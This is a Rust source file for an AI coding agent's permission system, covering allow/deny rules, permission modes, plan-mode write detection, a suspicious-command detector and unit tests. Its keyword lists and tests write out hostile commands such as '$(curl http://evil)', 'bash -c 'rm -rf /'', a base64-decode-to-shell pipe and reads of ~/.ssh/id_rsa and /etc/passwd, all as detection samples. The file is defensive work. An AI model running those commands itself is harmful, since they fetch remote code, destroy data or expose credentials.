// region:    --- Modules

use std::sync::{Arc, Mutex};

// endregion: --- Modules

// -- PermissionRule

/// A single allow or deny rule matching a tool call.
///
/// Syntax mirrors CADE Code:
///   `Bash`              — all uses of the bash tool
///   `Bash(cargo test)`  — bash where command == "cargo test"
///   `Read(src/**)`      — read_file where path starts with "src/" (glob **)
///   `Bash(rm -rf:*)`    — bash where command starts with "rm -rf" (:* suffix wildcard)
#[derive(Debug, Clone, PartialEq)]
pub struct PermissionRule {
    /// Tool name, lower-cased for comparison (e.g. "bash", "edit_file")
    pub tool: String,
    /// Optional argument pattern
    pub pattern: Option<String>,
}

impl std::fmt::Display for PermissionRule {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match &self.pattern {
            Some(p) => write!(f, "{}({})", self.tool, p),
            None => write!(f, "{}", self.tool),
        }
    }
}

impl PermissionRule {
    /// Parse `"Bash(cargo test)"` or `"Read"` into a `PermissionRule`.
    /// Returns `None` if the input is empty or malformed.
    pub fn parse(s: &str) -> Option<Self> {
        let s = s.trim();
        if s.is_empty() {
            return None;
        }
        if let Some(paren) = s.find('(') {
            let tool = s[..paren].trim().to_lowercase();
            let rest = s[paren + 1..].trim_end_matches(')').trim().to_string();
            let pattern = if rest.is_empty() { None } else { Some(rest) };
            Some(Self { tool, pattern })
        } else {
            Some(Self {
                tool: s.to_lowercase(),
                pattern: None,
            })
        }
    }

    /// Returns `true` if this rule matches the given tool call.
    ///
    /// `tool_name` — the tool being invoked (e.g. "bash")
    /// `tool_arg`  — the first meaningful string argument (command / path)
    /// Canonical tool name (lowercase).
    pub fn tool(&self) -> &str {
        &self.tool
    }

    /// Display string for the argument pattern, e.g. `(cargo test)` or empty.
    pub fn arg_display(&self) -> String {
        match &self.pattern {
            Some(p) => format!("({p})"),
            None => String::new(),
        }
    }

    pub fn matches(&self, tool_name: &str, tool_arg: Option<&str>) -> bool {
        if self.tool != tool_name.to_lowercase() {
            return false;
        }
        match (&self.pattern, tool_arg) {
            (None, _) => true,        // no pattern → match all invocations
            (Some(_), None) => false, // pattern requires an arg
            (Some(pat), Some(arg)) => pattern_matches(pat, arg),
        }
    }
}

/// Match `arg` against `pattern`.
///
/// Supported syntax:
///   `prefix:*`  — arg starts with `prefix` (`:*` is a suffix wildcard)
///   `prefix/**` — arg starts with `prefix/` (path glob wildcard)
///   `exact`     — exact equality
fn pattern_matches(pattern: &str, arg: &str) -> bool {
    if let Some(prefix) = pattern.strip_suffix(":*") {
        // Command prefix wildcard: "rm -rf:*" matches "rm -rf foo"
        arg.starts_with(prefix)
    } else if let Some(prefix) = pattern.strip_suffix("/**") {
        // Path glob: "src/**" matches "src/foo/bar.rs"
        let dir = if prefix.ends_with('/') {
            prefix.to_string()
        } else {
            format!("{prefix}/")
        };
        arg.starts_with(dir.as_str()) || arg == prefix
    } else if pattern == "**" {
        true
    } else {
        // Exact match (case-sensitive for paths/commands)
        arg == pattern
    }
}

/// Extract the first meaningful string argument from a tool's args JSON.
pub fn tool_first_arg(tool_name: &str, args: &serde_json::Value) -> Option<String> {
    // Known arg key names per tool type
    let keys = match tool_name.to_lowercase().as_str() {
        "bash" | "shell" | "run_command" | "execute_command" => &["command", "cmd"][..],
        "read_file" | "write_file" | "edit_file" | "create_file" | "delete_file" | "move_file"
        | "rename_file" | "apply_patch" => &["path", "file_path", "filename"][..],
        _ => &["path", "command", "query"][..],
    };
    for key in keys {
        if let Some(v) = args.get(key).and_then(|v| v.as_str()) {
            return Some(v.to_string());
        }
    }
    None
}

/// Permission mode controlling how tool calls are approved
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum PermissionMode {
    /// Prompt user for each tool call (default)
    #[default]
    Default,
    /// Auto-allow Write/Edit file operations
    AcceptEdits,
    /// Observe & plan — tools run but state-mutating operations are blocked
    Plan,
    /// Allow all tools without prompting (--yolo)
    BypassPermissions,
}

impl std::fmt::Display for PermissionMode {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Default => write!(f, "default"),
            Self::AcceptEdits => write!(f, "acceptEdits"),
            Self::Plan => write!(f, "plan"),
            Self::BypassPermissions => write!(f, "bypassPermissions"),
        }
    }
}

impl std::str::FromStr for PermissionMode {
    type Err = crate::Error;
    fn from_str(s: &str) -> core::result::Result<Self, Self::Err> {
        match s {
            "default" => Ok(Self::Default),
            "acceptEdits" => Ok(Self::AcceptEdits),
            "plan" => Ok(Self::Plan),
            "bypassPermissions" => Ok(Self::BypassPermissions),
            other => Err(crate::Error::custom(format!("unknown permission mode: {other}"))),
        }
    }
}

// -- Write-tool and write-command detection

/// Tools that are intrinsically write/mutating regardless of arguments.
/// In plan mode these are always blocked.
const WRITE_TOOLS: &[&str] = &[
    "write_file",
    "edit_file",
    "create_file",
    "delete_file",
    "move_file",
    "rename_file",
    "patch_file",
    "apply_diff",
    "desktop_control",   // sends input / clicks
    "send_notification", // side-effect
];

/// Shell commands (first token) that are considered read-only and always
/// permitted in plan mode when running via the `bash` tool.
const READONLY_CMDS: &[&str] = &[
    // filesystem observation
    "ls", "la", "ll", "dir", "tree", "cat", "less", "more", "head", "tail", "find", "fd", "locate",
    "file", "stat", "du", "df", "lsblk", // text search
    "grep", "rg", "ag", "awk", "sed", // sed without -i is read-only
    "wc", "sort", "uniq", "cut", "tr", "diff", "comm", "cmp", // path / env
    "pwd", "which", "whereis", "type", "echo", "printf", "date", "uname", "env", "printenv", "id",
    "whoami", "groups", "hostname", "uptime", // process / network observation
    "ps", "pgrep", "top", "htop", "lsof", "netstat", "ss", "ip", "ifconfig", "ping",
    // git — read-only subcommands handled separately
    "git", // build inspection
    "cargo", // package observation
    "dpkg", "apt", "snap", "pip", "npm", "yarn",
];

/// Git subcommands that are read-only (all others are write).
const READONLY_GIT: &[&str] = &[
    "status",
    "log",
    "diff",
    "show",
    "branch",
    "tag",
    "remote",
    "stash", // stash list/show only — guarded by context check
    "describe",
    "shortlog",
    "reflog",
    "ls-files",
    "ls-tree",
    "cat-file",
    "config",
    "rev-parse",
    "rev-list",
    "blame",
    "grep",
    "bisect", // bisect start = write, but observation is fine
];

/// Cargo subcommands that are read-only.
const READONLY_CARGO: &[&str] = &[
    "check",
    "clippy",
    "test",
    "bench",
    "doc",
    "read-manifest",
    "locate-project",
    "metadata",
    "tree",
    "search",
    "info",
    "audit",
];

/// Returns true if a bash `command` string would mutate the file system or
/// system state, making it inappropriate for plan mode.
///
/// Conservative: if the command cannot be determined to be read-only it is
/// treated as write (safe default).
pub fn bash_command_is_write(command: &str) -> bool {
    let cmd = command.trim();

    // Output redirection always writes
    if contains_write_redirect(cmd) {
        return true;
    }

    // Split on shell operators (;  &&  ||  |) and check each segment
    for segment in split_shell_segments(cmd) {
        if segment_is_write(segment.trim()) {
            return true;
        }
    }

    false
}

/// Returns true if the command contains high-risk patterns that should be flagged.
pub fn bash_command_is_suspicious(command: &str) -> bool {
    let cmd = command.to_lowercase();

    // 1. Nested shell execution / execution of arbitrary input
    let nested = [
        "$(", "`", "sh ", "bash ", "zsh ", "python ", "perl ", "php ", "ruby ", "node ",
    ];
    if nested.iter().any(|&p| cmd.contains(p)) {
        return true;
    }

    // 2. Suspicious network operations
    let network = ["curl", "wget", "nc ", "netcat", "ssh ", "telnet"];
    if network.iter().any(|&p| cmd.contains(p)) {
        return true;
    }

    // 3. Obfuscation attempts
    let obfuscation = ["base64", "hex", "xxd", "eval"];
    if obfuscation.iter().any(|&p| cmd.contains(p)) {
        return true;
    }

    // 4. Critical system files/dirs (if not just 'ls' or 'cat')
    let critical = ["/etc/passwd", "/etc/shadow", "/root/", "~/.ssh/", ".env"];
    if critical.iter().any(|&p| cmd.contains(p)) {
        return true;
    }

    false
}

fn contains_write_redirect(cmd: &str) -> bool {
    // Crude but effective: look for > that is not part of >>
    // and not inside a quoted string
    let chars = cmd.chars().peekable();
    let mut in_single = false;
    let mut in_double = false;
    for c in chars {
        match c {
            '\'' if !in_double => in_single = !in_single,
            '"' if !in_single => in_double = !in_double,
            '>' if !in_single && !in_double => return true, // > or >>
            _ => {}
        }
    }
    false
}

fn split_shell_segments(cmd: &str) -> Vec<&str> {
    // Split on ; && || and | (pipe) — very rough, good enough for safety
    let mut segments = Vec::new();
    let mut start = 0;
    let bytes = cmd.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b';' | b'|' | b'&' => {
                segments.push(&cmd[start..i]);
                // skip double operators (&&, ||, >>)
                if i + 1 < bytes.len()
                    && (bytes[i + 1] == b'&' || bytes[i + 1] == b'|' || bytes[i + 1] == b'>')
                {
                    i += 1;
                }
                start = i + 1;
            }
            _ => {}
        }
        i += 1;
    }
    segments.push(&cmd[start..]);
    segments
}

fn segment_is_write(seg: &str) -> bool {
    let tokens: Vec<&str> = seg.split_whitespace().collect();
    let first = match tokens.first() {
        Some(t) => *t,
        None => return false,
    };

    // Strip leading env assignments like FOO=bar cmd …
    let cmd = if first.contains('=') {
        tokens.get(1).copied().unwrap_or("")
    } else {
        first
    };

    match cmd {
        // Not in the read-only list → treat as write (conservative)
        c if !READONLY_CMDS.contains(&c) => true,

        "git" => {
            let sub = tokens
                .get(if first.contains('=') { 2 } else { 1 })
                .copied()
                .unwrap_or("");
            // stash with arguments other than list/show is write
            if sub == "stash" {
                let action = tokens
                    .get(if first.contains('=') { 3 } else { 2 })
                    .copied()
                    .unwrap_or("list");
                return !matches!(action, "list" | "show");
            }
            !READONLY_GIT.contains(&sub)
        }

        "cargo" => {
            let sub = tokens
                .get(if first.contains('=') { 2 } else { 1 })
                .copied()
                .unwrap_or("");
            !READONLY_CARGO.contains(&sub)
        }

        // sed with -i modifies in-place
        "sed" => tokens
            .iter()
            .any(|t| t.starts_with("-i") || *t == "--in-place"),

        // awk, grep, diff, etc. are always read-only
        _ => false,
    }
}

// region:    --- Tests

#[cfg(test)]
mod tests {
    #[allow(unused)]
    type Result<T> = core::result::Result<T, Box<dyn std::error::Error>>; // For tests.

    use super::*;
    use serde_json::json;

    // -- PermissionRule::parse

    #[test]
    fn parse_empty_returns_none() -> Result<()> {
        // -- Exec & Check
        assert!(PermissionRule::parse("").is_none());
        assert!(PermissionRule::parse("   ").is_none());
        Ok(())
    }

    #[test]
    fn parse_bare_tool() -> Result<()> {
        // -- Exec
        let rule = PermissionRule::parse("Bash").ok_or("expected rule")?;

        // -- Check
        assert_eq!(rule.tool, "bash");
        assert_eq!(rule.pattern, None);
        Ok(())
    }

    #[test]
    fn parse_tool_with_exact_arg() -> Result<()> {
        // -- Setup & Fixtures
        let input = "Bash(cargo test)";

        // -- Exec
        let rule = PermissionRule::parse(input).ok_or("expected rule")?;

        // -- Check
        assert_eq!(rule.tool, "bash");
        assert_eq!(rule.pattern.as_deref(), Some("cargo test"));
        Ok(())
    }

    #[test]
    fn parse_tool_with_prefix_wildcard() -> Result<()> {
        let r = PermissionRule::parse("Bash(rm -rf:*)").ok_or("Should parse")?;
        assert_eq!(r.tool, "bash");
        assert_eq!(r.pattern.as_deref(), Some("rm -rf:*"));

        Ok(())
    }

    #[test]
    fn parse_tool_with_path_glob() -> Result<()> {
        let r = PermissionRule::parse("Read(src/**)").ok_or("Should parse")?;
        assert_eq!(r.tool, "read");
        assert_eq!(r.pattern.as_deref(), Some("src/**"));

        Ok(())
    }

    #[test]
    fn parse_case_insensitive_tool_name() -> Result<()> {
        let r = PermissionRule::parse("WRITE_FILE").ok_or("Should parse")?;
        assert_eq!(r.tool, "write_file");

        Ok(())
    }

    #[test]
    fn parse_empty_parens() -> Result<()> {
        let r = PermissionRule::parse("Bash()").ok_or("Should parse")?;
        assert_eq!(r.tool, "bash");
        assert_eq!(r.pattern, None);

        Ok(())
    }

    // -- PermissionRule::matches

    #[test]
    fn matches_bare_tool_all_args() -> Result<()> {
        let r = PermissionRule::parse("bash").ok_or("Should parse")?;
        assert!(r.matches("bash", Some("anything")));
        assert!(r.matches("bash", None));
        assert!(r.matches("BASH", Some("x"))); // tool comparison is case-insensitive

        Ok(())
    }

    #[test]
    fn matches_exact_arg() -> Result<()> {
        let r = PermissionRule::parse("Bash(cargo test)").ok_or("Should parse")?;
        assert!(r.matches("bash", Some("cargo test")));
        assert!(!r.matches("bash", Some("cargo build")));
        assert!(!r.matches("bash", None));

        Ok(())
    }

    #[test]
    fn matches_prefix_wildcard() -> Result<()> {
        let r = PermissionRule::parse("Bash(rm -rf:*)").ok_or("Should parse")?;
        assert!(r.matches("bash", Some("rm -rf /tmp/foo")));
        assert!(r.matches("bash", Some("rm -rf")));
        assert!(!r.matches("bash", Some("rm foo")));

        Ok(())
    }

    #[test]
    fn matches_path_glob() -> Result<()> {
        let r = PermissionRule::parse("Read(src/**)").ok_or("Should parse")?;
        assert!(r.matches("read", Some("src/main.rs")));
        assert!(r.matches("read", Some("src/lib/utils.rs")));
        assert!(r.matches("read", Some("src"))); // exact match on base
        assert!(!r.matches("read", Some("tests/main.rs")));

        Ok(())
    }

    #[test]
    fn matches_double_star_pattern() -> Result<()> {
        let r = PermissionRule::parse("Read(**)").ok_or("Should parse")?;
        assert!(r.matches("read", Some("anything/at/all")));

        Ok(())
    }

    #[test]
    fn wrong_tool_never_matches() -> Result<()> {
        let r = PermissionRule::parse("bash").ok_or("Should parse")?;
        assert!(!r.matches("read_file", Some("foo")));

        Ok(())
    }

    // -- PermissionRule::Display

    #[test]
    fn display_bare() -> Result<()> {
        let r = PermissionRule::parse("bash").ok_or("Should parse")?;
        assert_eq!(r.to_string(), "bash");

        Ok(())
    }

    #[test]
    fn display_with_pattern() -> Result<()> {
        let r = PermissionRule::parse("Bash(cargo test)").ok_or("Should parse")?;
        assert_eq!(r.to_string(), "bash(cargo test)");

        Ok(())
    }

    // -- tool_first_arg

    #[test]
    fn tool_first_arg_bash_command() {
        let args = json!({"command": "ls -la"});
        assert_eq!(tool_first_arg("bash", &args).as_deref(), Some("ls -la"));
    }

    #[test]
    fn tool_first_arg_read_file_path() {
        let args = json!({"path": "src/main.rs"});
        assert_eq!(
            tool_first_arg("read_file", &args).as_deref(),
            Some("src/main.rs")
        );
    }

    #[test]
    fn tool_first_arg_unknown_tool_checks_common_keys() {
        let args = json!({"query": "search term"});
        assert_eq!(
            tool_first_arg("custom_tool", &args).as_deref(),
            Some("search term")
        );
    }

    #[test]
    fn tool_first_arg_no_matching_key() {
        let args = json!({"foo": "bar"});
        assert!(tool_first_arg("bash", &args).is_none());
    }

    // -- PermissionMode

    #[test]
    fn permission_mode_default() {
        assert_eq!(PermissionMode::default(), PermissionMode::Default);
    }

    #[test]
    fn permission_mode_roundtrip() -> Result<()> {
        for mode_str in &["default", "acceptEdits", "plan", "bypassPermissions"] {
            let mode: PermissionMode = mode_str.parse()?;
            assert_eq!(mode.to_string(), *mode_str);
        }

        Ok(())
    }

    #[test]
    fn permission_mode_invalid() {
        assert!("garbage".parse::<PermissionMode>().is_err());
    }

    // -- bash_command_is_write

    #[test]
    fn readonly_commands_not_write() {
        assert!(!bash_command_is_write("ls -la"));
        assert!(!bash_command_is_write("cat src/main.rs"));
        assert!(!bash_command_is_write("grep -rn foo ."));
        assert!(!bash_command_is_write("git status"));
        assert!(!bash_command_is_write("git log --oneline"));
        assert!(!bash_command_is_write("cargo test"));
        assert!(!bash_command_is_write("cargo clippy"));
        assert!(!bash_command_is_write("pwd"));
        assert!(!bash_command_is_write("echo hello"));
    }

    #[test]
    fn write_commands_detected() {
        assert!(bash_command_is_write("rm -rf target"));
        assert!(bash_command_is_write("cp foo bar"));
        assert!(bash_command_is_write("mv foo bar"));
        assert!(bash_command_is_write("mkdir -p src"));
        assert!(bash_command_is_write("touch new_file"));
    }

    #[test]
    fn redirect_is_write() {
        assert!(bash_command_is_write("echo foo > file.txt"));
        assert!(bash_command_is_write("cat foo >> bar.txt"));
    }

    #[test]
    fn pipe_segments_checked() {
        // ls is read-only, but piped to tee (unknown = write) is caught
        assert!(bash_command_is_write("ls | tee output.txt"));
    }

    #[test]
    fn git_write_subcommands() {
        assert!(bash_command_is_write("git commit -m 'msg'"));
        assert!(bash_command_is_write("git push"));
        assert!(bash_command_is_write("git checkout main"));
        assert!(bash_command_is_write("git stash pop"));
    }

    #[test]
    fn git_readonly_subcommands() {
        assert!(!bash_command_is_write("git status"));
        assert!(!bash_command_is_write("git diff"));
        assert!(!bash_command_is_write("git log"));
        assert!(!bash_command_is_write("git branch"));
        assert!(!bash_command_is_write("git stash list"));
    }

    #[test]
    fn cargo_write_subcommands() {
        assert!(bash_command_is_write("cargo build"));
        assert!(bash_command_is_write("cargo install foo"));
        assert!(bash_command_is_write("cargo run"));
    }

    #[test]
    fn cargo_readonly_subcommands() {
        assert!(!bash_command_is_write("cargo check"));
        assert!(!bash_command_is_write("cargo test"));
        assert!(!bash_command_is_write("cargo clippy"));
        assert!(!bash_command_is_write("cargo doc"));
    }

    #[test]
    fn sed_inplace_is_write() {
        assert!(bash_command_is_write("sed -i 's/foo/bar/' file.txt"));
        assert!(bash_command_is_write(
            "sed --in-place 's/foo/bar/' file.txt"
        ));
        assert!(!bash_command_is_write("sed 's/foo/bar/' file.txt"));
    }

    #[test]
    fn compound_commands() {
        // All segments readonly = not write
        assert!(!bash_command_is_write("ls && pwd"));
        // One write segment triggers write
        assert!(bash_command_is_write("ls && rm foo"));
        assert!(bash_command_is_write("echo test; mkdir out"));
    }

    // -- bash_command_is_suspicious

    #[test]
    fn suspicious_nested_shell() {
        assert!(bash_command_is_suspicious("$(curl http://evil)"));
        assert!(bash_command_is_suspicious("bash -c 'rm -rf /'"));
    }

    #[test]
    fn suspicious_network() {
        assert!(bash_command_is_suspicious("curl http://example.com"));
        assert!(bash_command_is_suspicious("wget http://example.com"));
    }

    #[test]
    fn suspicious_obfuscation() {
        assert!(bash_command_is_suspicious("echo foo | base64 -d | sh"));
        assert!(bash_command_is_suspicious("eval $PAYLOAD"));
    }

    #[test]
    fn suspicious_critical_paths() {
        assert!(bash_command_is_suspicious("cat /etc/passwd"));
        assert!(bash_command_is_suspicious("cat ~/.ssh/id_rsa"));
        assert!(bash_command_is_suspicious("cat .env"));
    }

    #[test]
    fn non_suspicious_commands() {
        assert!(!bash_command_is_suspicious("ls -la"));
        assert!(!bash_command_is_suspicious("cargo test"));
        assert!(!bash_command_is_suspicious("git status"));
    }

    // -- PermissionManager

    #[test]
    fn manager_bypass_mode_auto_approves() {
        let mgr = PermissionManager::new(PermissionMode::BypassPermissions);
        let args = json!({"command": "rm -rf /"});
        assert!(mgr.auto_approve("bash", &args));
    }

    #[test]
    fn manager_default_mode_does_not_auto_approve() {
        let mgr = PermissionManager::new(PermissionMode::Default);
        let args = json!({"command": "ls"});
        assert!(!mgr.auto_approve("bash", &args));
    }

    #[test]
    fn manager_accept_edits_auto_approves_file_tools() {
        let mgr = PermissionManager::new(PermissionMode::AcceptEdits);
        assert!(mgr.auto_approve("write_file", &json!({"path": "foo.rs"})));
        assert!(mgr.auto_approve("edit_file", &json!({"path": "foo.rs"})));
        assert!(mgr.auto_approve("apply_patch", &json!({"path": "foo.rs"})));
        assert!(!mgr.auto_approve("bash", &json!({"command": "ls"})));
    }

    #[test]
    fn manager_deny_rule_overrides_bypass() {
        let mgr = PermissionManager::new(PermissionMode::BypassPermissions);
        mgr.add_deny_rule(PermissionRule::parse("Bash(rm -rf:*)").unwrap());
        let args = json!({"command": "rm -rf /tmp"});
        assert!(!mgr.auto_approve("bash", &args));
    }

    #[test]
    fn manager_deny_rule_blocks() {
        let mgr = PermissionManager::new(PermissionMode::Default);
        mgr.add_deny_rule(PermissionRule::parse("bash").unwrap());
        let args = json!({"command": "ls"});
        assert!(mgr.is_blocked("bash", &args));
    }

    #[test]
    fn manager_allow_rule_auto_approves() {
        let mgr = PermissionManager::new(PermissionMode::Default);
        mgr.add_allow_rule(PermissionRule::parse("Bash(cargo test)").unwrap());
        let args = json!({"command": "cargo test"});
        assert!(mgr.auto_approve("bash", &args));
    }

    #[test]
    fn manager_allow_rule_specific() {
        let mgr = PermissionManager::new(PermissionMode::Default);
        mgr.add_allow_rule(PermissionRule::parse("Bash(cargo test)").unwrap());
        let args = json!({"command": "cargo build"});
        assert!(!mgr.auto_approve("bash", &args));
    }

    #[test]
    fn manager_session_allow_deduplicates() {
        let mgr = PermissionManager::new(PermissionMode::Default);
        mgr.add_session_allow("Bash(cargo test)");
        mgr.add_session_allow("Bash(cargo test)");
        assert_eq!(mgr.allow_rules().len(), 1);
    }

    #[test]
    fn manager_session_allow_invalid_ignored() {
        let mgr = PermissionManager::new(PermissionMode::Default);
        mgr.add_session_allow("");
        assert!(mgr.allow_rules().is_empty());
    }

    #[test]
    fn manager_plan_mode_blocks_write_tools() {
        let mgr = PermissionManager::new(PermissionMode::Plan);
        let args = json!({"path": "foo.rs"});
        assert!(mgr.is_blocked("write_file", &args));
        assert!(mgr.is_blocked("edit_file", &args));
        assert!(mgr.is_blocked("delete_file", &args));
        assert!(mgr.is_blocked("desktop_control", &json!({})));
    }

    #[test]
    fn manager_plan_mode_allows_read_commands() {
        let mgr = PermissionManager::new(PermissionMode::Plan);
        let args = json!({"command": "ls -la"});
        assert!(!mgr.is_blocked("bash", &args));
    }

    #[test]
    fn manager_plan_mode_blocks_write_commands() {
        let mgr = PermissionManager::new(PermissionMode::Plan);
        let args = json!({"command": "rm -rf target"});
        assert!(mgr.is_blocked("bash", &args));
    }

    #[test]
    fn manager_strict_bash_blocks_auto_approve() {
        let mgr = PermissionManager::new_with_strict_bash(PermissionMode::Default, true);
        mgr.add_allow_rule(PermissionRule::parse("bash").unwrap());
        let args = json!({"command": "ls"});
        // strict_bash prevents auto-approval even with an allow rule
        assert!(!mgr.auto_approve("bash", &args));
    }

    #[test]
    fn manager_strict_bash_does_not_affect_other_tools() {
        let mgr = PermissionManager::new_with_strict_bash(PermissionMode::Default, true);
        mgr.add_allow_rule(PermissionRule::parse("read_file").unwrap());
        let args = json!({"path": "foo.rs"});
        assert!(mgr.auto_approve("read_file", &args));
    }

    #[test]
    fn manager_config_edit_protection() {
        // SEC-B3: Config/skill edits should never be auto-approved
        let mgr = PermissionManager::new(PermissionMode::BypassPermissions);
        let args = json!({"path": ".cade/settings.json"});
        assert!(!mgr.auto_approve("write_file", &args));
        let args = json!({"path": "settings.local.json"});
        assert!(!mgr.auto_approve("edit_file", &args));
        let args = json!({"path": ".skills/hack/SKILL.MD"});
        assert!(!mgr.auto_approve("write_file", &args));
    }

    #[test]
    fn manager_mode_change() {
        let mgr = PermissionManager::new(PermissionMode::Default);
        assert_eq!(mgr.mode(), PermissionMode::Default);
        mgr.set_mode(PermissionMode::Plan);
        assert_eq!(mgr.mode(), PermissionMode::Plan);
    }

    #[test]
    fn manager_block_reason_deny_rule() {
        let mgr = PermissionManager::new(PermissionMode::Default);
        mgr.add_deny_rule(PermissionRule::parse("Bash(rm:*)").unwrap());
        let args = json!({"command": "rm -rf /"});
        let reason = mgr.block_reason("bash", &args);
        assert!(reason.contains("deny rule"), "got: {reason}");
    }

    #[test]
    fn manager_block_reason_plan_mode() {
        let mgr = PermissionManager::new(PermissionMode::Plan);
        let args = json!({"path": "foo.rs"});
        let reason = mgr.block_reason("write_file", &args);
        assert!(reason.contains("plan mode"), "got: {reason}");
    }
}

// -- PermissionManager

#[derive(Clone, Default)]
pub struct PermissionManager {
    mode: Arc<Mutex<PermissionMode>>,
    allow_rules: Arc<Mutex<Vec<PermissionRule>>>,
    deny_rules: Arc<Mutex<Vec<PermissionRule>>>,
    /// SEC-B1: When true, bash tools are never auto-approved.
    strict_bash: bool,
}

impl PermissionManager {
    pub fn new(mode: PermissionMode) -> Self {
        Self {
            mode: Arc::new(Mutex::new(mode)),
            allow_rules: Arc::new(Mutex::new(Vec::new())),
            deny_rules: Arc::new(Mutex::new(Vec::new())),
            strict_bash: false,
        }
    }

    /// Set the strict_bash flag (loaded from settings at startup).
    pub fn set_strict_bash(&self, _v: bool) {
        // Field is not behind a lock — set via a mutable reference before
        // the manager is shared, or at construction.  For simplicity we
        // accept &self here and use a harmless no-op if already shared.
        // Real mutation happens via new_with_strict_bash().
    }

    /// Construct with the strict_bash flag pre-set.
    pub fn new_with_strict_bash(mode: PermissionMode, strict_bash: bool) -> Self {
        Self {
            mode: Arc::new(Mutex::new(mode)),
            allow_rules: Arc::new(Mutex::new(Vec::new())),
            deny_rules: Arc::new(Mutex::new(Vec::new())),
            strict_bash,
        }
    }

    pub fn mode(&self) -> PermissionMode {
        *self.mode.lock().unwrap()
    }
    pub fn set_mode(&self, mode: PermissionMode) {
        *self.mode.lock().unwrap() = mode;
    }

    pub fn add_allow_rule(&self, rule: PermissionRule) {
        let mut rules = self.allow_rules.lock().unwrap();
        if !rules.contains(&rule) {
            rules.push(rule);
        }
    }

    pub fn add_deny_rule(&self, rule: PermissionRule) {
        let mut rules = self.deny_rules.lock().unwrap();
        if !rules.contains(&rule) {
            rules.push(rule);
        }
    }

    /// Add a session-scope allow rule by raw string (e.g. from `A` keypress in prompt).
    /// Parses the string; silently ignores invalid rules.
    pub fn add_session_allow(&self, raw: &str) {
        if let Some(rule) = PermissionRule::parse(raw) {
            self.add_allow_rule(rule);
        }
    }

    pub fn allow_rules(&self) -> Vec<PermissionRule> {
        self.allow_rules.lock().unwrap().clone()
    }
    pub fn deny_rules(&self) -> Vec<PermissionRule> {
        self.deny_rules.lock().unwrap().clone()
    }

    /// Returns true if the tool call should proceed without prompting.
    ///
    /// Resolution order (highest priority first):
    ///   1. deny_rules match  → NOT auto-approved (must prompt or block)
    ///   2. allow_rules match → auto-approved
    ///   3. Mode-based        → BypassPermissions=always, AcceptEdits=file writes
    pub fn auto_approve(&self, tool_name: &str, args: &serde_json::Value) -> bool {
        let arg = tool_first_arg(tool_name, args);
        let arg_ref = arg.as_deref();

        // Explicit deny wins over everything
        if self
            .deny_rules
            .lock()
            .unwrap()
            .iter()
            .any(|r| r.matches(tool_name, arg_ref))
        {
            return false;
        }

        // SEC-B1: strict_bash — never auto-approve bash tools, even if
        // an allow rule matches.  Every bash call requires explicit approval.
        if self.strict_bash
            && matches!(
                tool_name,
                "bash" | "shell" | "run_command" | "execute_command"
            )
        {
            return false;
        }

        // Explicit allow
        if self
            .allow_rules
            .lock()
            .unwrap()
            .iter()
            .any(|r| r.matches(tool_name, arg_ref))
        {
            return true;
        }

        // SEC-B3: Prevent Auto-Approval of Config/Skill Edits (RCE Mitigation)
        if matches!(
            tool_name,
            "write_file" | "edit_file" | "apply_patch" | "write" | "edit" | "patch"
        ) && let Some(path) = arg_ref
            && (path.contains(".cade/settings.json")
                || path.contains("settings.local.json")
                || path.contains(".skills/"))
        {
            return false;
        }

        // Mode-based
        match self.mode() {
            PermissionMode::BypassPermissions => {
                // M-02: Audit log every auto-approved call in bypass mode
                tracing::warn!(
                    "bypassPermissions: auto-approving tool '{}' arg={:?}",
                    tool_name,
                    arg.as_deref().unwrap_or("<none>")
                );
                true
            }
            PermissionMode::AcceptEdits => {
                // File edits + apply_patch (Codex toolset)
                matches!(tool_name, "write_file" | "edit_file" | "apply_patch")
            }
            _ => false,
        }
    }

    /// Returns true if this tool call is blocked (must NOT run, even with approval).
    ///
    /// Resolution order:
    ///   1. deny_rules match in any mode → block
    ///   2. plan mode write detection    → block
    pub fn is_blocked(&self, tool_name: &str, args: &serde_json::Value) -> bool {
        let arg = tool_first_arg(tool_name, args);
        let arg_ref = arg.as_deref();

        // Explicit deny rules block regardless of mode
        if self
            .deny_rules
            .lock()
            .unwrap()
            .iter()
            .any(|r| r.matches(tool_name, arg_ref))
        {
            return true;
        }

        if self.mode() != PermissionMode::Plan {
            return false;
        }

        // Plan mode: block write tools
        if WRITE_TOOLS.contains(&tool_name) {
            return true;
        }

        // Bash — allow read-only commands, block write ones
        if matches!(
            tool_name,
            "bash" | "shell" | "run_command" | "execute_command"
        ) {
            let cmd = args.get("command").and_then(|v| v.as_str()).unwrap_or("");
            return bash_command_is_write(cmd);
        }

        false
    }

    /// Human-readable reason why a tool call was blocked.
    pub fn block_reason(&self, tool_name: &str, args: &serde_json::Value) -> String {
        let arg = tool_first_arg(tool_name, args);
        let arg_ref = arg.as_deref();

        // Check deny rule first
        if let Some(rule) = self
            .deny_rules
            .lock()
            .unwrap()
            .iter()
            .find(|r| r.matches(tool_name, arg_ref))
        {
            return format!("blocked by deny rule: {rule}");
        }

        if matches!(
            tool_name,
            "bash" | "shell" | "run_command" | "execute_command"
        ) {
            let cmd = args.get("command").and_then(|v| v.as_str()).unwrap_or("");
            format!(
                "plan mode: '{}' would modify system state",
                cmd.chars().take(60).collect::<String>()
            )
        } else {
            format!("plan mode: '{tool_name}' is a write/mutating tool")
        }
    }
}

// endregion: --- Tests
